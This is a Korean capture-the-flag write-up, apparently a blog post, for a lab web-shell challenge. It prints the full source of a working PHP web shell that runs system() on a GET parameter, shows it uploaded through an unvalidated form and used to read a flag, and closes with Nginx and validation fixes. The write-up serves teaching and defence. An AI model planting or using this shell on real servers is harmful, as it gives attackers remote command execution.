+++
title = "VulnABLE CTF [LUXORA] Write-up: Web Shell 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Web Shell", "Bronze", "File Upload", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Web Shell 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Advanced Layer (Web Shell)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/webshell/bronze`
- **목표**: 파일 업로드 폼의 검증이 부실한 점을 이용하여, 운영체제 명령어를 실행할 수 있는 백도어 스크립트(Web Shell)를 서버에 업로드하고 이를 호출하여 시스템 권한을 탈취하라. (※ 파일 업로드 챌린지와 유사하지만, 쉘 스크립트 자체의 작성과 활용에 중점을 둡니다.)

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/webshell/bronze` 경로에 접속하면 지원서나 이력서를 업로드하는 폼이 존재합니다.
이 폼은 `txt` 나 `pdf` 파일을 올리라고 안내하고 있습니다.

정상적인 텍스트 파일(`resume.txt`)을 올려봅니다.
업로드 성공 후, 다음과 같은 링크가 주어집니다:
`http://localhost:3000/uploads/resume.txt`

**[해커의 사고 과정]**
1. 내가 올린 파일이 서버의 공개된 디렉터리(`/uploads/`)에 그대로 저장되며, 브라우저를 통해 직접 접근이 가능하다.
2. 백엔드 서버가 PHP를 사용하고 있다면(응답 헤더에 `X-Powered-By: PHP` 등이 보일 경우), 확장자를 `.php` 로 바꾸어 악성 스크립트를 올려보자.
3. 서버에서 파일을 저장할 때 확장자를 검사하지 않는다면, 이 스크립트는 실행 권한을 얻게 된다.

---

## 💥 2. 취약점 식별 및 웹 쉘(Web Shell) 작성 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(GET shell.php?cmd=ls)--> [ Web Server ]
                                         |-- system('ls')
<-- Directory Listing -------------------|
```


### 💡 웹 쉘 스크립트 작성
웹 쉘은 서버 내부에서 해커의 명령어를 대신 입력해 주는 작은 프로그램입니다. 가장 기본적이고 널리 쓰이는 형태의 PHP 웹 쉘을 작성합니다.

**[파일 생성: `shell.php`]**
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="cmd" autofocus id="cmd" size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd'])) {
        // system() 함수를 이용하여 파라미터로 받은 문자열을 OS 쉘에서 실행
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

---

## 🚀 3. 공격 수행 및 결과 확인

작성한 `shell.php` 파일을 파일 업로드 폼을 통해 서버로 전송합니다.

### 🔍 서버 내부 동작 및 접근
개발자가 파일의 확장자나 MIME 타입을 전혀 검사하지 않았으므로(Bronze 난이도), 파일은 무사히 `/uploads/shell.php` 에 저장됩니다.

해커는 브라우저 주소창에 다음 URL을 입력하여 자신이 올린 웹 쉘에 접근합니다.
```http
http://localhost:3000/uploads/shell.php
```

화면에는 내가 방금 만든 조잡한 명령어 입력창(Input box)이 나타납니다.

### 🔍 시스템 명령어 실행 (RCE)
입력창에 리눅스 명령어 `id` 와 `ls -la /` 를 입력해 봅니다.
URL 상으로는 `http://localhost:3000/uploads/shell.php?cmd=ls+-la+/` 형태가 됩니다.

**[실행 결과]**
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)

total 88
drwxr-xr-x   1 root root  4096 Nov 12 10:00 .
drwxr-xr-x   1 root root  4096 Nov 12 10:00 ..
drwxr-xr-x   1 root root  4096 Nov 12 10:00 bin
drwxr-xr-x   2 root root  4096 Nov 12 10:00 boot
drwxr-xr-x   5 root root   360 Nov 12 10:00 dev
-rw-r--r--   1 root root    38 Nov 12 10:00 flag_webshell_bronze.txt
...
```

플래그 파일을 찾았으니 `cat /flag_webshell_bronze.txt` 명령어를 실행하여 플래그를 탈취합니다.

```text
FLAG{WEBSHELL_🥉_BASIC_PHP_UPLOAD_C4D5E6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

파일 업로드 기능에 필수적인 보안 조치(확장자 검증, 실행 권한 제거)가 전무할 때, 해커가 단 하나의 파일(Web Shell)을 통해 서버 전체를 완전히 장악(RCE)하는 과정을 시연했습니다.

**🔥 획득한 플래그:**
`FLAG{WEBSHELL_🥉_BASIC_PHP_UPLOAD_C4D5E6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자가 올린 파일을 무작정 신뢰하고, 웹 서버(Apache/Nginx)가 해당 파일을 스크립트로 해석하도록 방치한 것이 원인입니다.

* **안전한 패치 가이드**
1. **업로드 폴더 실행 권한 박탈 (가장 중요)**: 사용자가 업로드한 파일이 저장되는 디렉터리(`/uploads`)에서는 절대로 스크립트(PHP, JSP, ASP, Node 등)가 실행되지 않도록 웹 서버 설정을 변경해야 합니다.
   ```nginx
   # Nginx 설정 예시: uploads 폴더 안의 php 파일 실행 차단
   location ^~ /uploads/ {
       location ~ \.php$ {
           deny all;
       }
   }
   ```
2. **파일 이름 및 확장자 난수화**: `shell.php` 라는 이름 그대로 저장하지 말고, 업로드 즉시 서버가 UUID나 해시 값으로 파일 이름을 변경하고, 확장자도 확인된 이미지 확장자(예: `.jpg`)로 강제 변경하여 저장해야 합니다.
3. **MIME/매직 넘버(Magic Number) 검증**: 클라이언트가 보낸 확장자나 Content-Type을 믿지 말고, 파일의 첫 몇 바이트(시그니처)를 서버가 직접 읽어서 진짜 이미지/PDF 파일인지 검증해야 합니다.